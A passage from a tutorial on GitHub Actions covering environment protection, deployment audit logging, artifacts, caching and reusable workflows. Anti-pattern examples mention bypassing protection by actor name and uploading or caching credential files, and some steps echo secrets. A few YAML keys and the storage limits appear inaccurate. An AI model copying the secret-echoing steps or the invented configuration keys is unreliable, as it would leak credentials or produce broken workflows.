# ✗ Bypassing protection with conditional logic
jobs:
  deploy:
    if: contains(github.actor, 'bot')
    environment: production
    # Bad practice - circumvents protection rules
```

### 7. **Testing Protection Rules**

Verify your environment protection rules are working correctly:

```yaml
name: Test Environment Protection

on:
  push:
    branches: [test-protection]

jobs:
  test-staging:
    runs-on: ubuntu-latest
    environment:
      name: staging
    steps:
      - run: echo "This should pause if staging has reviewers"

  test-production:
    runs-on: ubuntu-latest
    environment:
      name: production
    steps:
      - run: echo "This should pause if production has reviewers"

  test-branch-restriction:
    runs-on: ubuntu-latest
    if: github.ref_name == 'main'
    environment:
      name: production
    steps:
      - run: echo "This only runs on main branch"
```

### 8. **Monitoring and Auditing Deployments**

View deployment history and approvals:

```yaml
jobs:
  audit-deployment:
    runs-on: ubuntu-latest
    steps:
      - name: Check Deployment Status
        run: |
          echo "Deployment ID: ${{ github.run_id }}"
          echo "Environment: ${{ github.environment }}"
          echo "Requested by: ${{ github.actor }}"
          echo "Timestamp: $(date)"
```

View in GitHub UI:

- Navigate to `Settings > Environments > [Environment Name]`
- View "Deployments" tab for history
- See approvals and denials in the deployment timeline

---

### 9. **Advanced Environment Protections**

#### Deployment Branches and Restrictions

Control which branches can deploy to specific environments:

```yaml
environment:
  name: production
  deployment-branch-policy:
    protected-branches: true # Only protected branches can deploy
    custom-deployment-branch-policies:
      - main
      - release/*
```

**Branch Policy Matrix:**

| Setting                             | Effect                              | Use Case                           |
| ----------------------------------- | ----------------------------------- | ---------------------------------- |
| `protected-branches: true`          | Only branches with protection rules | Enterprise: compliance requirement |
| `custom-branches: [main, release/]` | Only specific branches/patterns     | Controlled rollout strategy        |
| No filter                           | Any branch                          | Development/staging environments   |

#### Required Reviewers with Role-Based Access

```yaml
environment:
  name: production
  reviewers:
    - security-team
    - platform-leads
  deployment-branch-policy:
    protected-branches: true
```

**Reviewer Access Control (in Settings):**

- **All users**: Anyone in org can review
- **Specific organizations**: External org teams
- **Specific users**: Named individuals with elevated credentials
- **Specific teams**: Role-based (engineering, devops, security)

#### Custom Deployment Scripts with Approval Gates

Combine deployment protection rules with custom scripts for maximum control:

```yaml
name: Controlled Deployment

on:
  push:
    branches: [main]

jobs:
  pre-deployment-checks:
    runs-on: ubuntu-latest
    outputs:
      business-hours: ${{ steps.check-time.outputs.is-business-hours }}
      approval-required: ${{ steps.check-approval.outputs.required }}
    steps:
      - id: check-time
        run: |
          HOUR=$(date +%H)
          if [ $HOUR -ge 9 ] && [ $HOUR -le 17 ]; then
            echo "is-business-hours=true" >> $GITHUB_OUTPUT
          else
            echo "is-business-hours=false" >> $GITHUB_OUTPUT
          fi

      - id: check-approval
        run: |
          # Check if risky files changed
          if git diff origin/main HEAD --name-only | grep -E '^(src/auth|src/payment)'; then
            echo "required=true" >> $GITHUB_OUTPUT
          else
            echo "required=false" >> $GITHUB_OUTPUT
          fi

  deploy:
    needs: pre-deployment-checks
    runs-on: ubuntu-latest
    environment:
      name: ${{ needs.pre-deployment-checks.outputs.approval-required == 'true' && 'production-with-approval' || 'production' }}
      url: https://example.com
    steps:
      - uses: actions/checkout@v3
      - name: Deploy
        run: bash deploy.sh
```

#### Approval Timeout and Wait Timers

Set how long reviewers have to approve:

```yaml
environment:
  name: production
  # Settings > Environments > Wait timer
  wait-timer: 24 # 24-hour window for approvals
  deployment-branch-policy:
    protected-branches: true
  reviewers:
    - senior-engineers
```

**Deployment Timeout Behavior:**

- Approval timeout = workflow waits max 24 hours for reviewer decision
- After timeout: deployment **queued** (doesn't fail), reviewer can still approve
- Re-run: manual re-run resets timer and restarts job

#### Environment Secrets with Restricted Scope

Secrets at environment level have stricter access controls:

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: production
      # Secrets defined here automatically scoped to:
      # - This environment only
      # - This repository only
      # - Only accessible during deployments to this env
    steps:
      - run: echo ${{ secrets.PROD_API_KEY }} # Only available in production environment
```

**Multi-Environment Secret Strategy:**

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ matrix.environment }}
    strategy:
      matrix:
        environment: [staging, production]
    steps:
      - name: Deploy to ${{ matrix.environment }}
        run: |
          export API_KEY=${{ secrets.API_KEY }}
          bash deploy.sh
      # Each environment has its own API_KEY secret
      # GitHub automatically injects the right one based on environment
```

#### Deployment Status Checks and CI Requirements

Require CI checks to pass before deployment:

```yaml
# In Settings > Branch Protection:
# - Require status checks to pass
# - Require branches to be up to date before merging
# - Dismiss stale pull request approvals

# In workflow:
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm test

  deploy:
    needs: test # Implicit dependency
    runs-on: ubuntu-latest
    environment: production
    if: success() # Fail fast if tests don't pass
    steps:
      - run: bash deploy.sh
```

#### Monitoring Sensitive Deployments

Create audit trail for all deployments:

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://example.com
    steps:
      - uses: actions/checkout@v3

      - name: Log Deployment Metadata
        run: |
          cat > /tmp/deployment.log <<EOF
          Deployment Audit Log
          ====================
          Timestamp: $(date -u)
          Repository: $GITHUB_REPOSITORY
          Branch: $GITHUB_REF_NAME
          Commit SHA: $GITHUB_SHA
          Commit Message: $(git log -1 --pretty=%B)
          Triggered By: $GITHUB_ACTOR
          Workflow: $GITHUB_WORKFLOW
          Run ID: $GITHUB_RUN_ID
          EOF
          cat /tmp/deployment.log

      - name: Upload Deployment Log
        uses: actions/upload-artifact@v3
        with:
          name: deployment-logs
          path: /tmp/deployment.log
          retention-days: 90

      - name: Notify Audit System
        run: |
          curl -X POST https://audit.example.com/deployments \
            -H "Content-Type: application/json" \
            -H "Authorization: Bearer ${{ secrets.AUDIT_TOKEN }}" \
            -d '{
              "repository": "${{ github.repository }}",
              "branch": "${{ github.ref_name }}",
              "sha": "${{ github.sha }}",
              "actor": "${{ github.actor }}",
              "timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'"
            }'
```

---

## GitHub Workflow Artifacts

Artifacts are files or collections of files created during a workflow run that you can use to share data between jobs in a workflow or store the outputs from individual jobs. Artifacts are essential for preserving build outputs, test results, logs, and other important data generated during your CI/CD pipeline.

### Overview of GitHub Artifacts

Artifacts provide several critical capabilities:

- **Data Persistence**: Store workflow outputs beyond the job execution
- **Inter-Job Communication**: Share files between different jobs in a workflow
- **Build Artifacts**: Preserve compiled binaries, containers, and deployment packages
- **Test Results**: Store test reports, coverage data, and screenshots
- **Logs and Debugging**: Keep detailed logs for troubleshooting failed workflows
- **Performance Metrics**: Archive performance benchmarks and metrics
- **Retention**: Control how long artifacts are stored (5 to 90 days)

### Why Use Artifacts

**Common Use Cases:**

1. **Build Outputs**: Save compiled code, binaries, and distributions
2. **Test Evidence**: Archive test reports, screenshots, and video recordings
3. **Cross-Job Dependencies**: Build in one job, test in another, deploy in a third
4. **Deployment Packages**: Store packaged applications for deployment jobs
5. **Performance Data**: Archive benchmark results and performance metrics
6. **Debugging**: Store logs and diagnostics from failed jobs
7. **Documentation**: Archive generated documentation from builds
8. **Publishing**: Store artifacts for release and distribution

### 1. **Uploading Artifacts**

Use the `actions/upload-artifact` action to save files and directories.

#### Basic Upload

```yaml
name: Upload Artifact Example

on: push

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Build Project
        run: |
          npm install
          npm run build

      - name: Upload Build Artifacts
        uses: actions/upload-artifact@v3
        with:
          name: build-output
          path: dist/
```

#### Upload Multiple Files

```yaml
- name: Upload Multiple Artifacts
  uses: actions/upload-artifact@v3
  with:
    name: build-artifacts
    path: |
      dist/
      build/
      coverage/
```

#### Upload with Patterns

```yaml
- name: Upload Specific Files
  uses: actions/upload-artifact@v3
  with:
    name: app-package
    path: |
      dist/**/*.js
      dist/**/*.css
      public/index.html
      !dist/**/*.map
```

#### Upload with Retention

```yaml
- name: Upload with Retention
  uses: actions/upload-artifact@v3
  with:
    name: build-output
    path: dist/
    retention-days: 30 # Keep for 30 days (default is 5)
```

### 2. **Downloading Artifacts**

Use the `actions/download-artifact` action to retrieve uploaded artifacts.

#### Download in Same Workflow

```yaml
name: Build and Deploy

on: push

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Build
        run: npm run build

      - name: Upload Build
        uses: actions/upload-artifact@v3
        with:
          name: build-dist
          path: dist/

  deploy:
    needs: build # Wait for build job to complete
    runs-on: ubuntu-latest
    steps:
      - name: Download Build Artifacts
        uses: actions/download-artifact@v3
        with:
          name: build-dist
          path: ./app-dist/

      - name: Deploy
        run: |
          echo "Deploying files from $(ls ./app-dist/)"
          # Deploy logic here
```

#### Download All Artifacts

```yaml
- name: Download All Artifacts
  uses: actions/download-artifact@v3
  with:
    path: artifacts/ # Downloads all artifacts to this directory
```

#### Download Across Workflows

```yaml
- name: Download from Previous Workflow
  uses: actions/download-artifact@v3
  with:
    name: build-dist
    github-token: ${{ secrets.GITHUB_TOKEN }}
    run-id: 1234567890 # Specific workflow run ID
```

### 3. **Practical Example: Build, Test, and Deploy**

```yaml
name: Complete CI/CD Pipeline

on:
  push:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.version.outputs.version }}
    steps:
      - uses: actions/checkout@v3

      - name: Set Version
        id: version
        run: echo "version=v1.0.${{ github.run_number }}" >> $GITHUB_OUTPUT

      - name: Build Application
        run: |
          npm install
          npm run build
          echo "Build version: ${{ steps.version.outputs.version }}"

      - name: Create Build Info
        run: |
          cat > build-info.json <<EOF
          {
            "version": "${{ steps.version.outputs.version }}",
            "commit": "${{ github.sha }}",
            "branch": "${{ github.ref_name }}",
            "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
          }
          EOF

      - name: Upload Build
        uses: actions/upload-artifact@v3
        with:
          name: app-build-${{ steps.version.outputs.version }}
          path: |
            dist/
            build-info.json
          retention-days: 30

  test:
    needs: build
    runs-on: ubuntu-latest
    strategy:
      matrix:
        node-version: [14, 16, 18]
    steps:
      - uses: actions/checkout@v3

      - name: Use Node.js ${{ matrix.node-version }}
        uses: actions/setup-node@v3
        with:
          node-version: ${{ matrix.node-version }}

      - name: Install Dependencies
        run: npm ci

      - name: Run Tests
        run: npm test -- --coverage

      - name: Upload Coverage Reports
        uses: actions/upload-artifact@v3
        with:
          name: coverage-node-${{ matrix.node-version }}
          path: coverage/

  deploy:
    needs: [build, test]
    runs-on: ubuntu-latest
    if: success()
    environment:
      name: production
      url: https://example.com
    steps:
      - name: Download Build Artifacts
        uses: actions/download-artifact@v3
        with:
          name: app-build-${{ needs.build.outputs.version }}
          path: ./app/

      - name: Read Build Info
        id: buildinfo
        run: cat ./app/build-info.json | jq '.' > $GITHUB_OUTPUT

      - name: Deploy to Production
        run: |
          echo "Deploying version: ${{ needs.build.outputs.version }}"
          echo "Build Time: $(jq -r '.timestamp' ./app/build-info.json)"
          # Deploy logic
          ls -la ./app/dist/

      - name: Upload Deployment Log
        if: always()
        uses: actions/upload-artifact@v3
        with:
          name: deployment-log-${{ needs.build.outputs.version }}
          path: deploy.log
```

### 4. **Artifact Storage and Limits**

Understand GitHub's artifact storage policies:

#### Storage Limits

| Plan       | Storage   | Retention |
| ---------- | --------- | --------- |
| Free       | 500 MB    | 5 days    |
| Pro        | 1 GB      | 5 days    |
| Team       | 2 GB      | 5 days    |
| Enterprise | Unlimited | 5 days    |

#### Retention Policy

```yaml
- name: Short Retention (CI Logs)
  uses: actions/upload-artifact@v3
  with:
    name: ci-logs
    path: logs/
    retention-days: 3 # Quick cleanup

- name: Long Retention (Releases)
  uses: actions/upload-artifact@v3
  with:
    name: release-package
    path: dist/
    retention-days: 90 # Keep longer for releases
```

### 5. **Advanced Artifact Usage**

#### Conditional Artifact Upload

```yaml
- name: Upload on Failure
  if: failure() # Only upload if previous step failed
  uses: actions/upload-artifact@v3
  with:
    name: failure-logs
    path: |
      logs/
      error-dump/

- name: Upload on Success
  if: success()
  uses: actions/upload-artifact@v3
  with:
    name: success-build
    path: dist/
```

#### Merging Multiple Artifacts

```yaml
jobs:
  collect-results:
    needs: [test-unit, test-integration, test-e2e]
    runs-on: ubuntu-latest
    if: always() # Run even if previous jobs failed
    steps:
      - name: Download All Test Results
        uses: actions/download-artifact@v3
        with:
          path: test-results/

      - name: Combine Results
        run: |
          mkdir -p combined-results
          find test-results -name "*.xml" -exec cp {} combined-results/ \;
          echo "Combined $(find combined-results -type f | wc -l) test result files"

      - name: Upload Combined Results
        uses: actions/upload-artifact@v3
        with:
          name: all-test-results
          path: combined-results/
```

#### Artifact with Metadata

```yaml
- name: Create Artifact with Metadata
  run: |
    mkdir -p release-package
    cp -r dist release-package/

    # Create metadata file
    cat > release-package/metadata.json <<EOF
    {
      "version": "${{ github.ref_name }}",
      "commit": "${{ github.sha }}",
      "author": "${{ github.actor }}",
      "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
      "build_number": ${{ github.run_number }}
    }
    EOF

- name: Upload with Metadata
  uses: actions/upload-artifact@v3
  with:
    name: release-${{ github.ref_name }}
    path: release-package/
```

### 6. **Using Artifacts for Releases**

```yaml
name: Build and Release

on:
  push:
    tags:
      - "v*"

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Build Release Package
        run: |
          npm install
          npm run build
          npm run package

      - name: Upload Release Assets
        uses: actions/upload-artifact@v3
        with:
          name: release-assets
          path: |
            dist/
            CHANGELOG.md
            LICENSE

  release:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Download Artifacts
        uses: actions/download-artifact@v3
        with:
          name: release-assets
          path: ./release/

      - name: Create GitHub Release
        uses: softprops/action-gh-release@v1
        with:
          files: |
            ./release/dist/**
            ./release/CHANGELOG.md
          draft: false
          prerelease: false
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

### 7. **Best Practices for Artifacts**

#### ✓ Recommended Practices — Artifacts

```yaml
# ✓ Use descriptive artifact names
- name: Upload Build
  uses: actions/upload-artifact@v3
  with:
    name: build-${{ runner.os }}-${{ github.run_number }}
    path: dist/
    retention-days: 30

# ✓ Upload artifacts only when needed
- name: Upload on Failure
  if: failure()
  uses: actions/upload-artifact@v3
  with:
    name: failure-diagnostics
    path: logs/

# ✓ Use paths to filter included files
- name: Upload Slim Artifacts
  uses: actions/upload-artifact@v3
  with:
    name: app
    path: |
      dist/**/*.js
      dist/**/*.css
      dist/index.html
    # Excludes source maps and other unnecessary files

# ✓ Set appropriate retention times
- name: Short-lived CI Logs
  uses: actions/upload-artifact@v3
  with:
    name: logs
    retention-days: 3

# ✓ Download artifacts with clear paths
- name: Download for Deployment
  uses: actions/download-artifact@v3
  with:
    name: production-build
    path: ./deploy-package/
```

#### ✗ Anti-Patterns to Avoid — Artifacts

```yaml
# ✗ Don't upload entire workspace
- name: Bad Upload
  uses: actions/upload-artifact@v3
  with:
    name: everything
    path: .  # Uploads everything, including node_modules!

# ✗ Don't forget retention management
- name: Unlimited Retention
  uses: actions/upload-artifact@v3
  with:
    name: artifact
    path: dist/
    # Retention-days not set, defaults to 5

# ✗ Don't upload sensitive information
- name: Bad Security Practice
  uses: actions/upload-artifact@v3
  with:
    name: secrets  # NEVER do this!
    path: |
      .env
      secrets.json
      private-keys/

# ✗ Don't rely on artifacts for permanent storage
jobs:
  build:
    steps:
      - run: npm run build
      - uses: actions/upload-artifact@v3
        with:
          name: build
          path: dist/
          retention-days: 90  # Still temporary!
          # Don't use for permanent archives; use releases instead
```

### 8. **Troubleshooting Artifacts**

#### Artifact Not Found

**Problem**: `Artifact not found: build-output`

**Solutions**:

```yaml
# Verify artifact exists before download
- name: Download Artifact
  uses: actions/download-artifact@v3
  with:
    name: build-output

- name: Check Contents
  run: ls -la ./build-output/ || echo "Artifact not found"
```

#### Storage Quota Exceeded

**Problem**: Workflow fails due to storage limits

**Solution**: Manage retention and cleanup

```yaml
# Upload with shorter retention
- name: Upload Logs
  uses: actions/upload-artifact@v3
  with:
    name: build-logs
    path: logs/
    retention-days: 3 # Cleanup faster

# Delete old artifacts via API
- name: Cleanup Old Artifacts
  run: |
    # Script to delete artifacts older than 30 days
    hub api repos/$GITHUB_REPOSITORY/actions/artifacts \
      --paginate | \
      jq -r '.artifacts[] | select(.created_at < now - "30 days") | .id' | \
      xargs -I {} hub api repos/$GITHUB_REPOSITORY/actions/artifacts/{} -X DELETE
```

#### Large File Size

**Problem**: Upload is slow or times out

**Solution**: Compress before uploading

```yaml
- name: Compress Artifacts
  run: |
    tar -czf build-archive.tar.gz dist/
    du -h build-archive.tar.gz  # Check size

- name: Upload Compressed
  uses: actions/upload-artifact@v3
  with:
    name: build-compressed
    path: build-archive.tar.gz

- name: Extract After Download
  run: tar -xzf build-archive.tar.gz
```

---

## GitHub Workflow Caching

### What is Workflow Caching

Workflow caching is a mechanism that stores files and directories during a workflow run and retrieves them in subsequent runs. Instead of downloading or rebuilding dependencies every time your workflow runs, cached files are restored, significantly reducing workflow execution time and bandwidth usage.

### Why Use Caching

**Key Benefits:**

1. **Performance**: Dramatically reduce workflow execution time by avoiding redundant downloads and builds
2. **Cost Efficiency**: Lower bandwidth usage and reduced resource consumption
3. **Reliability**: Reduce dependency on external services and network issues
4. **Developer Experience**: Faster feedback loops for CI/CD pipelines
5. **Scalability**: Enable faster builds as your project grows

**Real-World Impact Example:**

```text
Without Caching:
- Install dependencies: 3-5 minutes
- Build: 2 minutes
- Test: 3 minutes
- Total: 8-10 minutes per run

With Caching:
- Restore cache: 10-20 seconds
- Build: 2 minutes (unchanged)
- Test: 3 minutes (unchanged)
- Total: 5-6 minutes per run (40-50% improvement)
```

### How Caching Works

**Cache Mechanism:**

1. **Save Phase**: At end of workflow, specified files are zipped and stored
2. **Key Generation**: Cache is identified by a unique key based on files or inputs
3. **Restore Phase**: On next run, if key matches, cache is restored before workflow starts
4. **Fallback**: If exact key doesn't match, fallback keys are tried in order

**Storage Details:**

- Storage limit: 5 GB per repository
- Cache accessible only to same branch
- Cache expires after 7 days of no access
- Free tier provides full cache access

### 1. **Basic Caching**

#### Caching Dependencies

```yaml
name: Cache Dependencies

on: push

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      # Restore cache from previous runs
      - uses: actions/cache@v3
        with:
          path: ~/.npm
          key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}
          restore-keys: |
            ${{ runner.os }}-npm-

      # Cache hit will skip this install if exact key matches
      - name: Install Dependencies
        run: npm ci

      - name: Build
        run: npm run build
```

#### How This Works

```text
First Run:
- Cache key: ubuntu-npm-abc123def456
- Key not found in cache
- npm ci runs and downloads dependencies
- ~/.npm directory is cached

Second Run (same dependencies):
- Cache key: ubuntu-npm-abc123def456
- Key found! Cache restored
- npm ci runs but dependencies already present
- Execution ~50x faster

Third Run (dependencies updated):
- Cache key: ubuntu-npm-xyz789uvw012 (new hash)
- Key not found (new dependency hash)
- Falls back to: ubuntu-npm- (tries ubuntu-npm-*)
- Finds previous cache, uses as starting point
- Only new dependencies downloaded
```

#### Check if Cache Hit Occurred

```yaml
- uses: actions/cache@v3
  id: cache
  with:
    path: ~/.npm
    key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}

- name: Cache Status
  run: |
    if [ "${{ steps.cache.outputs.cache-hit }}" = "true" ]; then
      echo "✓ Cache hit! Dependencies restored"
    else
      echo "✗ Cache miss. Fresh dependencies installed"
    fi
```

### 2. **Multiple Cache Paths**

```yaml
- uses: actions/cache@v3
  with:
    path: |
      ~/.npm
      ~/.gradle/caches
      ~/.gradle/wrapper
    key: ${{ runner.os }}-build-${{ hashFiles('**/package-lock.json', '**/gradle.properties') }}
    restore-keys: |
      ${{ runner.os }}-build-
```

### 3. **Language-Specific Caching**

#### Node.js / npm / yarn

```yaml
# Cache npm dependencies
- uses: actions/cache@v3
  with:
    path: ~/.npm
    key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}

# Cache yarn dependencies
- uses: actions/cache@v3
  with:
    path: ~/.yarn/cache
    key: ${{ runner.os }}-yarn-${{ hashFiles('**/yarn.lock') }}
```

#### Python / pip

```yaml
- uses: actions/cache@v3
  with:
    path: ~/.cache/pip
    key: ${{ runner.os }}-pip-${{ hashFiles('**/requirements.txt') }}
    restore-keys: |
      ${{ runner.os }}-pip-
```

#### Java / Maven

```yaml
- uses: actions/cache@v3
  with:
    path: ~/.m2/repository
    key: ${{ runner.os }}-maven-${{ hashFiles('**/pom.xml') }}
```

#### Java / Gradle

```yaml
- uses: actions/cache@v3
  with:
    path: |
      ~/.gradle/caches
      ~/.gradle/wrapper
    key: ${{ runner.os }}-gradle-${{ hashFiles('**/gradle.properties', '**/gradle/wrapper/gradle-wrapper.properties') }}
```

#### Ruby / Bundler

```yaml
- uses: actions/cache@v3
  with:
    path: vendor/bundle
    key: ${{ runner.os }}-bundle-${{ hashFiles('**/Gemfile.lock') }}
```

### 4. **Practical Full CI Pipeline with Caching**

```yaml
name: Optimized CI with Caching

on: push

jobs:
  build-and-test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        node-version: [16, 18, 20]

    steps:
      - uses: actions/checkout@v3

      # Cache node_modules by Node version
      - name: Cache Node Modules
        uses: actions/cache@v3
        id: node-cache
        with:
          path: node_modules
          key: ${{ runner.os }}-node-${{ matrix.node-version }}-${{ hashFiles('**/package-lock.json') }}
          restore-keys: |
            ${{ runner.os }}-node-${{ matrix.node-version }}-
            ${{ runner.os }}-node-

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: ${{ matrix.node-version }}

      # Only run if cache miss
      - name: Install Dependencies
        if: steps.node-cache.outputs.cache-hit != 'true'
        run: npm ci

      # Cache build output
      - name: Cache Build Directory
        uses: actions/cache@v3
        id: build-cache
        with:
          path: dist
          key: ${{ runner.os }}-build-${{ matrix.node-version }}-${{ github.sha }}
          restore-keys: |
            ${{ runner.os }}-build-${{ matrix.node-version }}-

      - name: Build
        run: npm run build

      # Cache test coverage results
      - name: Run Tests
        run: npm test -- --coverage

      - name: Upload Coverage
        uses: actions/upload-artifact@v3
        with:
          name: coverage-node-${{ matrix.node-version }}
          path: coverage/
```

### 5. **Advanced Caching Strategies**

#### Restore Multiple Cache Keys in Order

```yaml
- uses: actions/cache@v3
  with:
    path: ~/.cache/build
    # Exact match first, then broader matches
    key: build-${{ runner.os }}-${{ github.sha }}
    restore-keys: |
      build-${{ runner.os }}-
      build-
```

#### Cache with Conditional Logic

```yaml
- name: Determine Cache Key
  id: cache-key
  run: |
    if [ "${{ github.event_name }}" = "pull_request" ]; then
      echo "key=pr-cache-${{ github.head_ref }}" >> $GITHUB_OUTPUT
    else
      echo "key=main-cache-${{ github.ref }}" >> $GITHUB_OUTPUT
    fi

- uses: actions/cache@v3
  with:
    path: build-cache/
    key: ${{ steps.cache-key.outputs.key }}
```

#### Clearing Cache When Needed

```bash
# Via GitHub CLI
gh actions-cache delete CACHE_KEY --repo OWNER/REPO --branch BRANCH

# Delete all caches for a branch
gh actions-cache list --repo OWNER/REPO --branch BRANCH | \
  cut -f 1 | xargs -I {} gh actions-cache delete {} \
  --repo OWNER/REPO --branch BRANCH --confirm
```

### 6. **Caching Best Practices**

#### ✓ Recommended Practices — Caching

```yaml
# ✓ Use hashFiles for cache keys based on lock files
- uses: actions/cache@v3
  with:
    path: ~/.npm
    key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}

# ✓ Include fallback restore keys
    restore-keys: |
      ${{ runner.os }}-npm-
      ${{ runner.os }}-

# ✓ Cache only necessary files
    path: node_modules  # Don't cache entire project

# ✓ Cache language-specific directories
    path: |
      ~/.npm
      ~/.cargo
      ~/.m2

# ✓ Check cache hit status
- if: steps.cache.outputs.cache-hit != 'true'
  run: npm ci
```

#### ✗ Anti-Patterns to Avoid — Caching

```yaml
# ✗ Don't cache entire repository
- uses: actions/cache@v3
  with:
    path: .  # BAD - caches entire project

# ✗ Don't use dynamic content in cache key
    key: ${{ github.run_number }}  # Changes every run!

# ✗ Don't cache files with secrets
    path: |
      ~/.ssh
      ~/.aws/credentials
      .env

# ✗ Don't ignore cache hit status
- run: npm ci  # Runs every time, defeating cache purpose
```

### 7. **Troubleshooting Caching**

#### Cache Not Being Used

```yaml
# Debug: Print cache key that would be generated
- name: Debug Cache Key
  run: |
    echo "Cache key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}"
    ls -la package-lock.json

# Check if cache is enabled
- name: Verify Cache Hit
  run: echo "Cache hit: ${{ steps.cache.outputs.cache-hit }}"
```

#### Cache Size Growing Too Large

```yaml
# Monitor cache size
- name: Check Cache Size
  run: |
    du -sh ~/.npm
    du -sh ~/.gradle/caches
    du -sh node_modules
```

---

## Workflow Sharing

### What is Workflow Sharing

Workflow sharing allows you to reuse workflow files across multiple repositories or share standardized automation patterns within your organization. Instead of duplicating workflow code, you can create a single source of truth and reference it from other repositories.

### Why Share Workflows

**Key Benefits:**

1. **Code Reuse**: Avoid duplicating workflows across repositories
2. **Consistency**: Ensure all projects follow the same CI/CD standards
3. **Maintainability**: Update workflows in one place, benefits all repositories
4. **Standardization**: Enforce organizational best practices
5. **Reduced Errors**: Centralized quality and security checks
6. **Quick Onboarding**: New projects inherit established workflows

**Real-World Scenario:**

```text
Scenario: Organization with 50 repositories

Without Sharing:
- Create workflows separately for each project
- Duplicate code across 50 repositories
- Update takes 50x effort
- Inconsistent standards across projects
- Risk of different security practices

With Sharing:
- Create workflow once in shared repository
- Import in all 50 projects with one line
- Update in one place, all projects updated
- Consistent standards organization-wide
- Centralized security policy enforcement
```

### How Workflow Sharing Works

**Sharing Methods:**

1. **Reusable Workflows**: Call workflows from other workflows (same/different repos)
2. **Shared Actions**: Create custom actions in a shared repository
3. **Workflow Templates**: GitHub provides starter templates
4. **Private Repository Actions**: Use actions from private repos with access token

### 1. **Reusable Workflows**

#### Creating a Reusable Workflow

```yaml
# .github/workflows/shared-tests.yml (in shared-workflows repository)
name: Shared Test Workflow

on:
  workflow_call:
    inputs:
      node-version:
        required: false
        type: string
        default: "18"
      test-command:
        required: false
        type: string
        default: "npm test"
    secrets:
      npm-token:
        required: false

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: ${{ inputs.node-version }}
          registry-url: "https://registry.npmjs.org"

      - name: Install Dependencies
        run: npm ci
        env:
          NODE_AUTH_TOKEN: ${{ secrets.npm-token }}

      - name: Run Tests
        run: ${{ inputs.test-command }}
```

#### Using a Reusable Workflow

```yaml
# .github/workflows/ci.yml (in consuming repository)
name: CI

on: push

jobs:
  test:
    uses: org/shared-workflows/.github/workflows/shared-tests.yml@main
    with:
      node-version: "20"
      test-command: "npm test -- --coverage"
    secrets:
      npm-token: ${{ secrets.NPM_TOKEN }}
```

**Passing secrets to reusable workflows — two patterns:**

```yaml
# Pattern A: Explicit mapping — pass named secrets individually
jobs:
  call-workflow:
    uses: org/shared-workflows/.github/workflows/deploy.yml@main
    with:
      environment: production
    secrets:
      deploy-token: ${{ secrets.DEPLOY_TOKEN }}
      api-key: ${{ secrets.API_KEY }}

# Pattern B: secrets: inherit — passes ALL caller secrets automatically.
# The called workflow can access them by the same name via ${{ secrets.* }}.
jobs:
  call-workflow:
    uses: org/shared-workflows/.github/workflows/deploy.yml@main
    with:
      environment: production
    secrets: inherit
```

**Choosing between the two patterns:**

|                 | Explicit mapping                      | `secrets: inherit`                          |
| --------------- | ------------------------------------- | ------------------------------------------- |
| Security        | Higher — only named secrets flow      | Lower — all secrets flow automatically      |
| Maintenance     | Higher — must list every secret       | Lower — no updates when secrets change      |
| Visibility      | Clear which secrets are used          | Implicit; reader must check called workflow |
| Recommended for | Public/third-party reusable workflows | Internal org-owned workflows                |

> **Note:** The called workflow must declare the secret in its `on.workflow_call.secrets:` block to receive it via explicit mapping. When using `secrets: inherit`, secrets are passed without requiring declaration in the called workflow.

#### Key Components

```yaml
on:
  workflow_call: # Makes this workflow reusable
    inputs: # Define inputs from caller
      parameter-name:
        type: string # string, boolean, number, environment
        required: false
        default: "value"
    secrets: # Define secrets from caller
      secret-name:
        required: true
    outputs: # Declare values this workflow returns to the caller
      artifact-version:
        description: "The version string of the built artifact"
        value: ${{ jobs.job-name.outputs.version }} # Must reference a job output

jobs:
  job-name:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.get-version.outputs.value }} # Promote step output to job output
    steps:
      - run: echo ${{ inputs.parameter-name }}
      - run: echo ${{ secrets.secret-name }}
      - name: Get version
        id: get-version
        run: echo "value=1.2.3" >> $GITHUB_OUTPUT
```

**How the caller accesses reusable workflow outputs:**

```yaml
# Calling workflow
jobs:
  build:
    uses: org/shared-workflows/.github/workflows/build.yml@main
    with:
      parameter-name: "hello"
    secrets:
      secret-name: ${{ secrets.MY_SECRET }}

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying version ${{ needs.build.outputs.artifact-version }}"
      # Access via: needs.<job-id>.outputs.<output-name>
      # where <job-id> is the job that called the reusable workflow
```

**Complete three-layer output chain:**

```text
Step output          →   Job output              →   Workflow output         →  Caller
echo "x=v" >>             jobs.<id>.outputs:          workflow_call.outputs:    needs.<job>.outputs.
$GITHUB_OUTPUT            key: ${{ steps.<id>         key:                      key
                              .outputs.key }}            value: ${{ jobs.<id>
                                                             .outputs.key }}
```

### 2. **Complete Reusable Workflow Examples**

#### Build and Push Docker Image (Reusable)

```yaml
# org/shared-workflows/.github/workflows/docker-build.yml
name: Docker Build and Push

on:
  workflow_call:
    inputs:
